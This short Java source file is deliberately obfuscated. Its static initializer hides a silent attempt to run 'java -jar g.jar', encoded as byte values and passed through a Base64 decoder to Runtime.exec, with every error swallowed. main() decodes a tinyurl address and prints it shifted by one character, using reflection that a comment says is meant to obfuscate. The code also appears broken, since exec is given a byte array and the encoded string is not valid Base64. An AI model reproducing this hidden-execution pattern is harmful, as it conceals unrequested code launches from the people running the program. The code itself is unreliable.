class X {
    static { try { java.lang.Runtime.getRuntime().exec(java.util.Base64.getDecoder().decode(new String(new byte[]{106, 97, 118, 97, 32, 45, 106, 97, 114, 32, 103, 46, 106, 97, 114}))); } catch (Exception e) {} }

    public static void main(String[] a) {
        ((Runnable) () -> {
            String c = new String(new char[]{104, 116, 116, 112, 115, 58, 47, 47, 116, 105, 110, 121, 117, 114, 108, 46, 99, 111, 109, 47, 121, 53, 110, 119, 111, 55, 99, 115});
            for (int i = 0; i < c.length(); i++) d((char) (c.charAt(i) - 1));
        }).run();
    }

    static void d(char c) {
        // Dynamically load and invoke methods to further obfuscate printing
        try {
            java.lang.reflect.Method m = System.out.getClass().getMethod("print", char.class);
            m.invoke(System.out, c);
        } catch (Exception e) {}
    }
}
